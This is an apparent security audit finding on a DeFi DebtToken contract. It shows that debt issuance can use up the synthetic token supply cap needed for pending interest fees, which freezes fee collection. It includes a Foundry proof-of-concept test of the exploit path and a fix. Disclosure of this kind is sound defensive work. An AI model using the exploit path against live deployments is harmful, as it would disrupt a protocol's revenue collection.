### Title
Debt issuance can consume synthetic supply headroom reserved for pending interest fees - (File: contracts/DebtToken.sol)

### Summary

`DebtToken.accrueInterest()` treats accrued interest as protocol revenue and attempts to mint it to `pool.feeCollector()`; if that mint fails, the amount is accumulated in `pendingInterestFee`. [1](#0-0)  However, `DebtToken.issue()` does not reserve synthetic-token supply headroom for that pending amount before minting the borrower’s issuance and issuance fee. [2](#0-1)  An unprivileged borrower can therefore consume the remaining `SyntheticToken.maxTotalSupply` capacity and cause subsequent `collectPendingInterestFee()` calls to revert until synthetic supply is burned. [3](#0-2) 

### Finding Description

During interest accrual, `DebtToken` increases `totalSupply_` and `debtIndex`, then attempts to mint the accrued amount plus any previously pending fee to the fee collector. [4](#0-3)  If `SyntheticToken.mint()` reverts, the catch block stores the full amount in `pendingInterestFee` instead of reverting the accrual. [5](#0-4) 

`SyntheticToken._mint()` enforces `maxTotalSupply` using only the already-minted `totalSupply`. [6](#0-5)  It has no knowledge of `DebtToken.pendingInterestFee`, so the pending protocol fee does not reduce the capacity available to a new issuance. [7](#0-6) 

`DebtToken.issue()` first calls `accrueInterest()`, checks only the borrower’s issuable collateral value, mints the debt position, and then mints the issuance fee plus borrower amount. [2](#0-1)  The borrower amount and issuance fee together consume the gross requested amount because `quoteIssueOut()` returns `amount_ - fee` and `fee`. [8](#0-7) 

The reachable sequence is:

1. Interest is accrued while the fee amount exceeds the remaining synthetic supply capacity.
2. `accrueInterest()` fails to mint that fee and stores it as `pendingInterestFee`. [1](#0-0) 
3. An attacker deposits sufficient collateral through `DepositToken.deposit()` and calls `DebtToken.issue()` for enough debt to consume the remaining synthetic supply. [9](#0-8) 
4. The issuance succeeds because `SyntheticToken._mint()` checks only `totalSupply + amount <= maxTotalSupply`. [6](#0-5) 
5. Public calls to `collectPendingInterestFee()` now revert when `pendingInterestFee` exceeds the remaining capacity. [3](#0-2) 

This is the same accounting flaw class: a protocol operation determines available capacity without including an already accrued but unclaimed fee liability.

### Impact Explanation

The pending protocol yield remains unminted and uncollectable while the synthetic token supply is saturated. [3](#0-2)  An attacker can continue occupying newly freed capacity whenever other users repay or burn synthetic tokens, repeatedly front-running fee collection and extending the freeze. [6](#0-5) 

The impact is temporary freezing of unclaimed protocol revenue rather than destruction of the fee: `pendingInterestFee` remains stored because it is cleared only after `syntheticToken.mint()` succeeds. [3](#0-2)  The condition does not make user collateral directly stealable or create bad debt, but it does break fee-collection liveness. [5](#0-4) 

### Likelihood Explanation

The attack requires a finite `SyntheticToken.maxTotalSupply`, enough existing debt and interest for the accrued fee to exceed the remaining supply capacity, and enough attacker collateral to issue debt up to that capacity. [10](#0-9)  These conditions are configuration- and market-dependent; if the deployed token keeps the default effectively unlimited supply or has ample headroom, the issue is not presently reachable. [11](#0-10) 

No privileged call is required for the exploitation path itself because `accrueInterest()`, `DepositToken.deposit()`, `DebtToken.issue()`, and `collectPendingInterestFee()` are publicly reachable. [12](#0-11)  The attacker only needs capital and cannot directly steal the frozen fee. [3](#0-2) 

### Recommendation

Reserve pending and newly accrued interest fees when validating issuance capacity. [13](#0-12)  After `accrueInterest()`, `DebtToken.issue()` and `flashIssue()` should calculate:

```solidity
uint256 syntheticRoom =
    syntheticToken.maxTotalSupply() - syntheticToken.totalSupply();

if (amount_ + pendingInterestFee > syntheticRoom) {
    revert SurpassMaxSynthSupply();
}
```

The equivalent accounting should also be applied to AMO minting and bridge minting if those paths can consume the same global supply capacity. [7](#0-6)  This ensures issuance cannot consume the supply room required for already accrued protocol revenue. [5](#0-4) 

### Proof of Concept

The following Foundry test models the public exploitation path on a deployment with a finite synthetic supply cap, active debt, and nonzero interest. [14](#0-13) 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

import {IPool} from "../contracts/interfaces/IPool.sol";
import {IDebtToken} from "../contracts/interfaces/IDebtToken.sol";
import {IDepositToken} from "../contracts/interfaces/IDepositToken.sol";
import {ISyntheticToken} from "../contracts/interfaces/ISyntheticToken.sol";
import {IMasterOracle} from "../contracts/interfaces/external/IMasterOracle.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract PendingInterestFeeHeadroomTest is Test {
    IPool internal pool;
    IDebtToken internal debtToken;
    ISyntheticToken internal syntheticToken;

    function test_issueConsumesSupplyNeededByPendingFee() public {
        pool = IPool(vm.envAddress("POOL"));
        debtToken = IDebtToken(vm.envAddress("DEBT_TOKEN"));
        syntheticToken = debtToken.syntheticToken();

        address attacker = makeAddr("attacker");

        // Wait until claimable interest exceeds current synthetic supply headroom.
        uint256 room = syntheticToken.maxTotalSupply() - syntheticToken.totalSupply();
        (, uint256 currentPending) = debtToken.getPendingInterestFee();

        while (currentPending <= room) {
            vm.warp(block.timestamp + 365 days);
            room = syntheticToken.maxTotalSupply() - syntheticToken.totalSupply();
            (, currentPending) = debtToken.getPendingInterestFee();
        }

        // Converts claimable current interest into stored pendingInterestFee.
        debtToken.accrueInterest();
        (uint256 storedPending, ) = debtToken.getPendingInterestFee();
        assertGt(storedPending, room);

        uint256 syntheticRoom =
            syntheticToken.maxTotalSupply() - syntheticToken.totalSupply();
        uint256 debtRoom =
            debtToken.maxTotalSupply() - debtToken.totalSupply();
        uint256 amountToIssue =
            syntheticRoom < debtRoom ? syntheticRoom : debtRoom;

        assertGt(amountToIssue, 0);

        // Fund the attacker with enough listed collateral to issue `amountToIssue`.
        IDepositToken depositToken =
            IDepositToken(pool.getDepositTokens()[0]);
        IERC20 underlying = depositToken.underlying();
        IMasterOracle oracle = pool.masterOracle();

        uint256 issueUsd =
            oracle.quoteTokenToUsd(address(syntheticToken), amountToIssue);
        uint256 collateralAmount =
            oracle.quoteUsdToToken(address(underlying), issueUsd * 4);

        deal(address(underlying), attacker, collateralAmount);

        vm.startPrank(attacker);
        underlying.approve(address(depositToken), collateralAmount);
        depositToken.deposit(collateralAmount, attacker);

        // The borrower amount plus issue fee consumes the remaining synth supply.
        debtToken.issue(amountToIssue, attacker);
        vm.stopPrank();

        assertEq(
            syntheticToken.totalSupply(),
            syntheticToken.maxTotalSupply()
        );

        (storedPending, ) = debtToken.getPendingInterestFee();
        assertGt(storedPending, 0);

        // The previously accrued protocol fee cannot now be collected.
        vm.expectRevert();
        debtToken.collectPendingInterestFee();

        // The fee remains pending after the failed collection.
        (storedPending, ) = debtToken.getPendingInterestFee();
        assertGt(storedPending, 0);
    }
}
```

The critical assertion is that `DebtToken.issue()` succeeds even though the stored fee is larger than the supply headroom, after which `collectPendingInterestFee()` reverts because `SyntheticToken._mint()` would exceed `maxTotalSupply`. [6](#0-5)
